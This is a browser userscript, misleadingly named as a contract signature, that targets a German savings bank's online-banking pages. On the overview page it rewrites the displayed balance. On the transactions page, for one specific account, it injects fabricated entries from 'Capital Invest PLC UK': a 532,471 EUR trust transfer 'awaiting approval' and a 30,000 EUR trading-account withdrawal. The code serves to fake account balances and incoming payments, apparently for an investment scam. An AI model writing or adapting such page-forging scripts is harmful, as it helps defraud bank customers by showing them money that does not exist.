// ==UserScript==
// @name         Vertragssignature Hans Friedrichs
...
// @match        https://www.foerde-sparkasse.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.foerde-sparkasse.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.foerde-sparkasse.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/466330/Vertragssignature%20Hans%20Friedrichs.user.js
// @updateURL https://update.greasyfork.org/scripts/466330/Vertragssignature%20Hans%20Friedrichs.meta.js
// ==/UserScript==
...
(function() {
    ...
    if (window.location.href.indexOf("finanzuebersicht") > 0) {
        ...
        if (vorgemerkt == "no"){
            ...
            var zwischenSumme = document.getElementsByClassName("balance-predecimal")[3].textContent;
            ...
            document.getElementsByClassName("balance-predecimal")[3].textContent = zwischenSummeNwc;
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == "9 1575 20" ){
            if (vorgemerkt == "no"){
            ...
            var xHTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 532.471,25 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Treuhand: Capital Invest PLC UK">Treuhand: Capital Invest PLC UK</a></h3><p>2023-05-04T10:15 Einreichung einer Treuhand Ueberweisung. Freigabe nötig durch Capital Invest PLC UK</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">532.471</span><span aria-hidden="true" class="balance-decimal plus">,05&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';

            //var save2HTML = document.getElementsByClassName("mkp-card-list")[1].innerHTML;
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 30.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Capital Invest PLC UK">Capital Invest PLC UK</a></h3><p>2023-05-04T10:11 Withdrawal Trading Account: AY01-503DE-SM</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">30.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">15.308,00 EUR</span></div></div></div></div></li>';
